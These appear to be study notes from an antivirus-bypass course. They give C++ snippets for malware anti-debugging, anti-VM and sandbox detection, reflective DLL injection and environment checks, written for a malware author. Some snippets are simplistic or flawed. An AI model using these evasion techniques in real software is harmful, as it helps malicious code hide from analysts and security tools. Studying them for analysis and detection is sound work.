# Index 
- [[4. Bypassing Antivirus (AV)]]
	- [[4.1 Static Analysis Evasion]]
	- [[4.2 Behavioral and Heuristic Evasion]]
	- [[4.3 Anti-Analysis Techniques]]

# Anti-Debugging Techniques

The goal of anti-debugging techniques is to detect whether a malware sample is being run under a debugger and, if so, modify its behavior (e.g., by terminating or hiding malicious actions).

#### Common Anti-Debugging Techniques

1.1. `IsDebuggerPresent()` Function:
   - This is one of the most straightforward methods to detect if a process is being debugged. If a debugger is detected, the malware can terminate itself or execute benign code.
   - Example:
     ```cpp
     #include <windows.h>

     void anti_debugger() {
         if (IsDebuggerPresent()) {
             ExitProcess(0);  // Exit if a debugger is detected
         }
     }
     ```

1.2. Checking Debug Flags in the Process Environment Block (PEB):
   - The PEB contains a field (`BeingDebugged`) that is set when a process is being debugged.
   - You can directly inspect the PEB structure to check for this flag, which avoids calling `IsDebuggerPresent()`, potentially bypassing simpler AV checks.
   - Example:
     ```cpp
     #include <windows.h>

     bool check_peb_debug_flag() {
         __asm {
             mov eax, fs:[30h]  // Get pointer to PEB
             mov al, [eax + 2]  // Check BeingDebugged flag
         }
     }

     void anti_debugger_peb() {
         if (check_peb_debug_flag()) {
             ExitProcess(0);  // Exit if being debugged
         }
     }
     ```

1.3. Timing Checks (Anti-Breakpoint Detection):
   - Some debuggers introduce overhead in the execution of a program. By measuring the time taken between specific points in your code (using `QueryPerformanceCounter` or `GetTickCount`), you can detect whether your malware is being stepped through slowly.
   - Example:
     ```cpp
     #include <windows.h>
     #include <iostream>

     void anti_debugger_timing() {
         DWORD timeBefore = GetTickCount();
         Sleep(100);  // Sleep for 100ms
         DWORD timeAfter = GetTickCount();
         if (timeAfter - timeBefore > 110) {  // A delay of > 110ms could indicate debugging
             ExitProcess(0);  // Exit if debug delay is detected
         }
     }
     ```

1.4. Manipulating SEH (Structured Exception Handling):
   - You can intentionally raise exceptions and then handle them to detect if a debugger is trying to catch these exceptions.
   - Example:
     ```cpp
     __try {
         RaiseException(EXCEPTION_BREAKPOINT, 0, 0, NULL);  // Trigger a breakpoint exception
     } __except(EXCEPTION_EXECUTE_HANDLER) {
         // No debugger is present if this is handled without interference
         std::cout << "Debugger not detected!" << std::endl;
     }
     ```

1.5. Anti-Debugger via `NtSetInformationThread`:
   - A less common method to hide from debuggers is to use the `NtSetInformationThread` API to hide the current thread from the debugger by disabling `DebugObject`.
   - Example:
     ```cpp
     typedef NTSTATUS(NTAPI *pNtSetInformationThread)(HANDLE, THREAD_INFORMATION_CLASS, PVOID, ULONG);
     void anti_debugger_hide_thread() {
         pNtSetInformationThread NtSIT = (pNtSetInformationThread)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtSetInformationThread");
         if (NtSIT) {
             NtSIT(GetCurrentThread(), (THREAD_INFORMATION_CLASS)0x11, NULL, 0);  // 0x11 = ThreadHideFromDebugger
         }
     }
     ```

# Anti-VM and Sandbox Detection

Virtual machines (VMs) and sandboxes are commonly used for malware analysis. Anti-VM techniques aim to detect if malware is running inside a virtualized or sandboxed environment and prevent execution or delay it until it confirms it's on a real system.

#### Common Anti-VM Techniques

2.1. Check for Known VM Artifacts:
   - You can look for specific VM-related drivers, files, or processes that only exist in virtualized environments (e.g., `vmtoolsd.exe` for VMware).
   - Example:
     ```cpp
     bool check_vmware() {
         HANDLE hFile = CreateFile("\\\\.\\vmwareuser", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
         if (hFile != INVALID_HANDLE_VALUE) {
             CloseHandle(hFile);
             return true;  // VM detected
         }
         return false;
     }
     ```

2.2. Detecting VM-Specific CPU Instructions (CPUID):
   - Virtual machines can be detected by querying the CPU and checking for specific identifiers or features that indicate virtualization.
   - Example:
     ```cpp
     bool check_cpuid_for_vm() {
         int cpuInfo[4];
         __cpuid(cpuInfo, 1);  // Query CPUID
         if ((cpuInfo[2] & (1 << 31)) != 0) {  // Hypervisor bit set in ECX
             return true;  // VM detected
         }
         return false;
     }
     ```

2.3. Querying BIOS or Hardware Information:
   - Malware can query the system’s BIOS information to look for signs of virtualization (e.g., strings like "VMware" or "VirtualBox").
   - Example:
     ```cpp
     bool check_bios_for_vm() {
         HKEY hKey;
         char value[100];
         DWORD valueLength = sizeof(value);
         if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
             RegQueryValueEx(hKey, "SystemBiosVersion", NULL, NULL, (LPBYTE)&value, &valueLength);
             RegCloseKey(hKey);
             if (strstr(value, "VMware") || strstr(value, "VirtualBox")) {
                 return true;  // VM detected
             }
         }
         return false;
     }
     ```

2.4. Timing Differences:
   - Sandboxes or VMs often have performance differences, such as slower time-based functions. By timing certain functions, malware can detect if it's running in a sandbox or VM.
   - This technique is similar to the anti-debugging technique using timing.

# Code Packing and Unpacking In-Memory

Packing refers to compressing or encrypting a binary’s contents to make it harder for analysts or AVs to inspect the code. The malware then unpacks itself during runtime, often completely in memory.

#### Reflective DLL Injection

Reflective DLL injection is an advanced technique where a DLL is injected and executed from memory without using the Windows loader. This prevents the file from being written to disk, making it harder to detect and analyze.

Steps for Reflective DLL Injection:
   1. Load the DLL into memory without writing it to disk.
   2. Manually resolve all dependencies (imports, exports, etc.) and adjust memory protections.
   3. Execute the DLL's code from memory.

Reflective DLL injection bypasses many AV systems because it doesn't touch the disk and doesn't rely on the typical DLL loading process.

Example (High-Level Overview):
   - You can find the full implementation of reflective DLL injection in many open-source libraries like Stephen Fewer's reflective DLL injection. Here's a high-level overview:
     ```cpp
     // This would be in the reflective loader function
     void *moduleBase = VirtualAlloc(NULL, size_of_image, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     memcpy(moduleBase, reflective_dll_in_memory, dll_size);
     // Resolve imports and relocate the DLL within the address space
     // Finally, invoke the entry point of the DLL
     DLLMAIN pDllMain = (DLLMAIN)((BYTE *)moduleBase + dll_entry_offset);
     pDllMain(NULL, DLL_PROCESS_ATTACH, NULL);  // Call DllMain of the loaded DLL
     ```

By keeping the entire process in memory and resolving the DLL manually, you avoid triggering traditional AV checks that rely on file I/O operations.

# Environment Checks

Malware often performs checks to ensure it's running in a real environment, not a sandbox or virtual machine. These checks can help malware avoid execution in environments designed for analysis.

#### Common Environment Check Techniques

4.1. Check System Uptime:
   - Many sandboxes have very short uptimes. Malware can refuse to run if the system uptime is below a certain threshold.
   - Example:
     ```cpp
     DWORD get_system_uptime() {
         return GetTickCount() / 1000;  // Get uptime in seconds
     }

     void check_system_uptime() {
         if (get_system_uptime() < 300) {  // Less than 5 minutes
             ExitProcess(0);  // Likely a sandbox
         }
     }
     ```

4.2. Check for Typical Software:
   - Sandboxes may lack common software like Microsoft Office, Adobe Reader, etc. Checking for the presence of this software can help verify if the system is real.
   - Example:
     ```cpp
     bool check_installed_software() {
         HKEY hKey;
         if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
             // Scan for typical software
             RegCloseKey(hKey);
             return true;  // Software detected
         }
         return false;
     }
     ```

4.3. Check for Human Interaction:
   - Many sandboxes don’t simulate human interaction. Malware can wait for specific user input, such as mouse movement or keyboard input, before executing.
   - Example:
     ```cpp
     POINT cursorPos;
     GetCursorPos(&cursorPos);
     if (cursorPos.x == 0 && cursorPos.y == 0) {
         // The cursor hasn't moved, assume it's a sandbox
         ExitProcess(0);
     }
     ```
